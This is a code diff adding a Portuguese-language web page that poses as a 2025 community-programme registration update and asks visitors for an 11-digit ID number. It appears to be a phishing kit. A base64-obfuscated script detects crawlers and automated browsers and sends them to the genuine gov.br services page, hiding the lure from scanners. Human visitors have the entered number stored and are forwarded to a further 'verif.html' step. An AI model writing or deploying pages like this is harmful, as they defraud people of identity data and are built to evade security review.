@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Atualização de Cadastro Comunitário 2025</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/7/7e/Info_icon_72x72.svg" type="image/x-icon">
+  <style>
+    body { font-family: Arial, sans-serif; background: #f5f7fa; margin: 0; padding: 0; text-align: center; }
+    header { background: #004aad; padding: 15px; color: white; }
+    .container { max-width: 500px; margin: 40px auto; background: white; padding: 20px; border-radius: 6px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
+    input, button { width: 100%; padding: 12px; margin: 12px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
+    button { background: #004aad; color: white; cursor: pointer; }
+    #loading { display: none; margin-top: 20px; font-size: 14px; color: #444; }
+    .loader { border: 4px solid #f3f3f3; border-top: 4px solid #004aad; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+<header>
+  <h1>Atualização de Cadastro</h1>
+</header>
+<div class="container">
+  <p>Confirme seus dados para manter acesso aos programas comunitários 2025.</p>
+  
+  <input 
+    type="text" 
+    id="doc" 
+    placeholder="Digite seu número de inscrição"
+    maxlength="11"
+    oninput="this.value = this.value.replace(/\\D/g,'').slice(0,11)"
+  >
+  
+  <button id="btn">CONTINUAR</button>
+  
+  <div id="loading">
+    <div class="loader"></div>
+    <p>Validando informações...</p>
+  </div>
+</div>
+
+<script>
+(function(){
+  const bots = atob("ZmFjZWJvb2ssY3Jhd2xlcixzcGlkZXIscm9ib3QscHJldmlldyxib3QtaW5kZXgsYXBwbGVib3Q=").split(",");
+  const ua = navigator.userAgent.toLowerCase();
+  window._isBot = bots.some(w => ua.includes(w)) || !navigator.webdriver === false;
+})();
+
+document.getElementById("btn").addEventListener("click", function(){
+  const doc = document.getElementById('doc').value.trim();
+  
+  if(doc.length < 8 || doc.length > 11){ 
+    alert("Digite um número válido com 8 a 11 dígitos."); 
+    return; 
+  }
+  
+  document.getElementById('loading').style.display = 'block';
+  
+  setTimeout(()=>{
+    if(!window._isBot){
+      sessionStorage.setItem("k", btoa(doc+"|"+Date.now()));
+      window.location.href = "verif.html";
+    } else {
+      window.location.href = "https://www.gov.br/pt-br/servicos";
+    }
+  }, 2000 + Math.random()*1500);
+});
+</script>
+
+</body>
+</html>
+
